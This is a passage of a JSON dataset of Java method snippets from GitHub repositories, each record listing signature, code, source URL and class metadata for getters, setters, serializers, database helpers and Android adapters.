"https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "StatusPedido", "snippet": "\tpublic StatusPedido getStatus() {\t\treturn status;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setStatus", "params": ["StatusPedido"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setStatus(StatusPedido status) {\t\tStatusPedido statusOrcamento= StatusPedido.ORCAMENTO;\t\tthis.status = statusOrcamento;\t\t\t\t\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFormaPagamento", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FormaPagamento", "snippet": "\tpublic FormaPagamento getFormaPagamento() {\t\treturn formaPagamento;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFormaPagamento", "params": ["FormaPagamento"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setFormaPagamento(FormaPagamento formaPagamento) {\t\tthis.formaPagamento = formaPagamento;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCliente", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Cliente", "snippet": "\tpublic Cliente getCliente() {\t\treturn cliente;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCliente", "params": ["Cliente"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCliente(Cliente cliente) {\t\tthis.cliente = cliente;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getEnderecoEntrega", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Endereco", "snippet": "\tpublic Endereco getEnderecoEntrega() {\t\treturn enderecoEntrega;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEnderecoEntrega", "params": ["Endereco"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setEnderecoEntrega(Endereco enderecoEntrega) {\t\tthis.enderecoEntrega = enderecoEntrega;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getItens", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ItemPedido>", "snippet": "\tpublic List<ItemPedido> getItens() {\t\treturn itens;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setItens", "params": ["List<ItemPedido>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setItens(List<ItemPedido> itens) {\t\tthis.itens = itens;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNumero", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getNumero() {\t\treturn numero;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setNumero", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setNumero(String n) {\t\tthis.numero = n;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hashCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int hashCode() {\t\tfinal int prime = 31;\t\tint result = 1;\t\tresult = prime * result + ((id == null) ? 0 : id.hashCode());\t\treturn result;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "equals", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean equals(Object obj) {\t\tif (this == obj)\t\t\treturn true;\t\tif (obj == null)\t\t\treturn false;\t\tif (getClass() != obj.getClass())\t\t\treturn false;\t\tPedido other = (Pedido) obj;\t\tif (id == null) {\t\t\tif (other.id != null)\t\t\t\treturn false;\t\t} else if (!id.equals(other.id))\t\t\treturn false;\t\treturn true;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "gerarNumeroPedido", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String gerarNumeroPedido() {\t\tRandom rdn = new Random();\t\tList<Integer> numeros = new ArrayList<Integer>();\t\tfor (int i = 0; i < 10; i++)\t\t\tnumeros.add(i);\t\tString n = \"\";\t\tfor (int i = 0; i < 10; i++) {\t\t\tn += numeros.remove(rdn.nextInt(numeros.size()));//            numero += numeros.remove(rdn.nextInt(numeros.size()));\t\t}\t\treturn numero = n;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDistributorId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getDistributorId() {\t\treturn distributorId;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/Distributor.java", "stars": "1", "class": {"name": "Distributor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setDistributorId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDistributorId(String distributorId) {\t\tthis.distributorId = distributorId;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/Distributor.java", "stars": "1", "class": {"name": "Distributor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getName() {\t\treturn name;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/Distributor.java", "stars": "1", "class": {"name": "Distributor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setName(String name) {\t\tthis.name = name;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/Distributor.java", "stars": "1", "class": {"name": "Distributor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getAddress", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getAddress() {\t\treturn Address;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/Distributor.java", "stars": "1", "class": {"name": "Distributor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setAddress", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAddress(String address) {\t\tAddress = address;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/Distributor.java", "stars": "1", "class": {"name": "Distributor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getPhoneNumber", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\tpublic long getPhoneNumber() {\t\treturn phoneNumber;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/Distributor.java", "stars": "1", "class": {"name": "Distributor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setPhoneNumber", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPhoneNumber(long phoneNumber) {\t\tthis.phoneNumber = phoneNumber;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/Distributor.java", "stars": "1", "class": {"name": "Distributor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\t\treturn \"DistributorEntity [distributorId=\" + distributorId + \", name=\" + name + \", Address=\" + Address\t\t\t\t+ \", phoneNumber=\" + phoneNumber + \"]\";\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/Distributor.java", "stars": "1", "class": {"name": "Distributor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setValue", "params": ["Map<String,T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValue(Map<String, T> s) {        this.value = s;    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/MapTag.java", "stars": "2", "class": {"name": "MapTag", "extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,T>", "snippet": "    public Map<String, T> getValue() {        return value;    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/MapTag.java", "stars": "2", "class": {"name": "MapTag", "extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/MapTag.java", "stars": "2", "class": {"name": "MapTag", "extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/MapTag.java", "stars": "2", "class": {"name": "MapTag", "extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"method_name": "writeData", "params": ["DataOutputStream"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeData(DataOutputStream dos) throws IOException {        // Indicates the string        dos.write(getID());        //Create a new DataOutputStream        ByteArrayOutputStream os = new ByteArrayOutputStream();        CountingOutputStream cos = new CountingOutputStream(os);        DataOutputStream tempDos = new DataOutputStream(cos);        tempDos.writeShort(name.getBytes(StandardCharsets.UTF_8).length);        tempDos.write(name.getBytes(StandardCharsets.UTF_8));        // The size of the array.        for(Map.Entry<String, T> entry : this.value.entrySet()){            entry.getValue().setName(entry.getKey());            entry.getValue().writeData(tempDos);        }        dos.writeInt(cos.getCount());        dos.write(os.toByteArray());        tempDos.close();    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/MapTag.java", "stars": "2", "class": {"name": "MapTag", "extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"method_name": "createFromData", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "Tag<Map>", "snippet": "    public Tag<Map<String, T>> createFromData(byte[] value) {        List<Tag<?>> data;        try{            data = ObjectDataStructure.getListData(value);        }catch(IOException ex){            ex.printStackTrace();            return null;        }        Map<String, T> output = new HashMap<>();        for(Tag<?> tag : data){            output.put(tag.getName(), (T) tag);            tag.setName(\"\");        }        this.value = output;        return this;    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/MapTag.java", "stars": "2", "class": {"name": "MapTag", "extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"method_name": "getID", "params": [], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte getID() {        return 10;    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/tags/MapTag.java", "stars": "2", "class": {"name": "MapTag", "extends": null, "implements": ["Tag"], "modifiers": ["public"]}}, {"method_name": "getLastInsertId", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "long", "snippet": "  public long getLastInsertId() throws SQLException {    // A default connection: autocommit = true.    long num = -1;    try {      num = ((Number) this.queryRunner          .query(this.conn, \"SELECT LAST_INSERT_ID();\", new ScalarHandler<>(1)))          .longValue();    } catch (final SQLException ex) {      logger.error(\"can not get last insertion ID\");      throw ex;    }    return num;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseTransOperator.java", "stars": "18", "class": {"name": "DatabaseTransOperator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "query", "params": ["String", "ResultSetHandler<T>", "Object"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T query(final String querySql, final ResultSetHandler<T> resultHandler,      final Object... params)      throws SQLException {    try {      return this.queryRunner.query(this.conn, querySql, resultHandler, params);    } catch (final SQLException ex) {      //RETRY Logic should be implemented here if needed.      throw ex;    } finally {      // Note: CAN NOT CLOSE CONNECTION HERE.    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseTransOperator.java", "stars": "18", "class": {"name": "DatabaseTransOperator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "update", "params": ["String", "Object"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int update(final String updateClause, final Object... params) throws SQLException {    try {      return this.queryRunner.update(this.conn, updateClause, params);    } catch (final SQLException ex) {      //RETRY Logic should be implemented here if needed.      throw ex;    } finally {      // Note: CAN NOT CLOSE CONNECTION HERE.    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseTransOperator.java", "stars": "18", "class": {"name": "DatabaseTransOperator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getConnection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Connection", "snippet": "  public Connection getConnection() {    return this.conn;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseTransOperator.java", "stars": "18", "class": {"name": "DatabaseTransOperator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\tScanner sc = new Scanner(System.in);\t\tSystem.out.println(\"Ingrese los simbolos terminales separados por coma\");\t\tString terminals = sc.nextLine();\t\tSystem.out.println(\"Ingrese los simbolos no terminales separados por coma\");\t\tString nonTerminals = sc.nextLine();\t\tSystem.out.println(\t\t\t\t\"Ingrese las producciones en formato NT-s1 o bien NT-s1|s2|s3... \\ndonde NT representa al simbolo no terminal, y sn representa a las prodcciones respectivas\");\t\tSystem.out.println(\"cuando termine de ingresar las producciones, por favor digite el caracter 0\");\t\tArrayList<String> productions = new ArrayList<String>();\t\tString production;\t\tdo {\t\t\tproduction = sc.nextLine();\t\t\tproductions.add(production);\t\t} while (!production.equals(\"0\"));\t\t\t\tchar initNT = productions.get(0).split(\"-\")[0].charAt(0);\t\tString firstIteration = findProduction(initNT, productions);\t\t\t\tSystem.out.println(findProduction(initNT, productions));\t\t\t\tSystem.out.println(\"Proceso termina con \u00e9xito\");\t}", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/tst/tests/GramaticalTest.java", "stars": "1", "class": {"name": "GramaticalTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "productionHasBifurcation", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "\tprivate static boolean productionHasBifurcation(String production) {\t\tfor (int i = 0; i < production.length(); i++) {\t\t\tif (production.charAt(i) == '|')\t\t\t\treturn true;\t\t}\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/tst/tests/GramaticalTest.java", "stars": "1", "class": {"name": "GramaticalTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "findProduction", "params": ["char", "ArrayList<String>"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "\tprivate static String findProduction(char nt, ArrayList<String> productions) {\t\tint i = 0;\t\tString result = \"\";\t\twhile(i<productions.size() && nt != productions.get(i).split(\"-\")[0].charAt(0))\t\t\ti++;\t\t\t\tif(nt == productions.get(i).split(\"-\")[0].charAt(0)) {\t\t\tString production = productions.get(i).split(\"-\")[1];\t\t\tif(productionHasBifurcation(production)) {\t\t\t\tString[] symbols = production.split(\"[|]\"); \t\t\t\tfor (int j = 0; j < symbols.length; j++) {\t\t\t\t\tresult += symbols[j];\t\t\t\t\tif (j < symbols.length - 1)\t\t\t\t\t\tresult += \",\";\t\t\t\t}\t\t\t}else {\t\t\t\tresult = production;\t\t\t}\t\t}else {\t\t\tSystem.out.println(\"S\u00edmbolo no terminal inv\u00e1lido\");\t\t}\t\treturn result;\t}", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/tst/tests/GramaticalTest.java", "stars": "1", "class": {"name": "GramaticalTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDeviceId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getDeviceId() {\t\treturn deviceId;\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/bean/RecordInfo.java", "stars": "29", "class": {"name": "RecordInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDeviceId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDeviceId(String deviceId) {\t\tthis.deviceId = deviceId;\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/bean/RecordInfo.java", "stars": "29", "class": {"name": "RecordInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getName() {\t\treturn name;\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/bean/RecordInfo.java", "stars": "29", "class": {"name": "RecordInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setName(String name) {\t\tthis.name = name;\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/bean/RecordInfo.java", "stars": "29", "class": {"name": "RecordInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSumNum", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getSumNum() {\t\treturn sumNum;\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/bean/RecordInfo.java", "stars": "29", "class": {"name": "RecordInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSumNum", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setSumNum(int sumNum) {\t\tthis.sumNum = sumNum;\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/bean/RecordInfo.java", "stars": "29", "class": {"name": "RecordInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRecordList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<RecordItem>", "snippet": "\tpublic List<RecordItem> getRecordList() {\t\treturn recordList;\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/bean/RecordInfo.java", "stars": "29", "class": {"name": "RecordInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRecordList", "params": ["List<RecordItem>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setRecordList(List<RecordItem> recordList) {\t\tthis.recordList = recordList;\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/bean/RecordInfo.java", "stars": "29", "class": {"name": "RecordInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {    return id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/camelcase/Camel.java", "stars": "15", "class": {"name": "Camel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(String id) {    this.id = id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/camelcase/Camel.java", "stars": "15", "class": {"name": "Camel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFirstName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFirstName() {    return firstName;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/camelcase/Camel.java", "stars": "15", "class": {"name": "Camel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFirstName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFirstName(String firstName) {    this.firstName = firstName;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/camelcase/Camel.java", "stars": "15", "class": {"name": "Camel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLAST_NAME", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getLAST_NAME() {    return LAST_NAME;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/camelcase/Camel.java", "stars": "15", "class": {"name": "Camel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLAST_NAME", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLAST_NAME(String last_name) {    LAST_NAME = last_name;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/camelcase/Camel.java", "stars": "15", "class": {"name": "Camel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getInstance", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "HttpClientManager", "snippet": "        public static HttpClientManager getInstance(){            synchronized(HttpClientManager.class){                if(pcm == null){                /*try {                    Thread.sleep(100);//\u5c06\u95ee\u9898\u6781\u7aef\u5316                } catch (InterruptedException e) {                }*/                    LayeredConnectionSocketFactory sslsf = null;                    try {                        sslsf = new SSLConnectionSocketFactory(SSLContext.getDefault());                    } catch (NoSuchAlgorithmException e) {                        e.printStackTrace();                    }                    Registry<ConnectionSocketFactory> socketFactoryRegistry = RegistryBuilder.<ConnectionSocketFactory> create()                            .register(\"https\", sslsf)                            .register(\"http\", new PlainConnectionSocketFactory())                            .build();                    pcm = new PoolingHttpClientConnectionManager(socketFactoryRegistry);                    pcm.setMaxTotal(10);                    pcm.setDefaultMaxPerRoute(5);                    hcm = new HttpClientManager();                    };                }          return hcm;        }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/builder/HttpClientManager.java", "stars": "2", "class": {"name": "HttpClientManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getHttpClient", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CloseableHttpClient", "snippet": "       public CloseableHttpClient getHttpClient() {            CloseableHttpClient httpClient = HttpClients.custom()                    .setConnectionManager(pcm)                    .build();            return httpClient;        }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/builder/HttpClientManager.java", "stars": "2", "class": {"name": "HttpClientManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "precioMedioAutomovil", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int precioMedioAutomovil() {        return 10000000;    }", "url": "https://raw.githubusercontent.com/EduarAlexis/SOLID/master/src/main/java/Solid/O/Ford_O.java", "stars": "1", "class": {"name": "Ford_O", "extends": "AbsAutomovil_O", "implements": null, "modifiers": ["public"]}}, {"method_name": "numAsientos", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numAsientos() {        return 5;    }", "url": "https://raw.githubusercontent.com/EduarAlexis/SOLID/master/src/main/java/Solid/O/Ford_O.java", "stars": "1", "class": {"name": "Ford_O", "extends": "AbsAutomovil_O", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.register_page);        Button btn_for_regcof;        btn_for_regcof = findViewById(R.id.register_regbtn);        btn_for_regcof.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                finish();            }        });    }", "url": "https://raw.githubusercontent.com/RotonNorrison/StirDiary/master/app/src/main/java/com/example/stirdiary/RegisterPage.java", "stars": "2", "class": {"name": "RegisterPage", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {        return list.size();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/adapter/ListMultiNormalAdapter.java", "stars": "2", "class": {"name": "ListMultiNormalAdapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object getItem(int position) {        return null;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/adapter/ListMultiNormalAdapter.java", "stars": "2", "class": {"name": "ListMultiNormalAdapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getItemId(int position) {        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/adapter/ListMultiNormalAdapter.java", "stars": "2", "class": {"name": "ListMultiNormalAdapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getView", "params": ["int", "View", "ViewGroup"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getView(final int position, View convertView, ViewGroup parent) {        final ViewHolder holder;        if (convertView == null) {            holder = new ViewHolder();            convertView = inflater.inflate(R.layout.list_video_item_mutli, null);            holder.gsyVideoPlayer = (MultiSampleVideo) 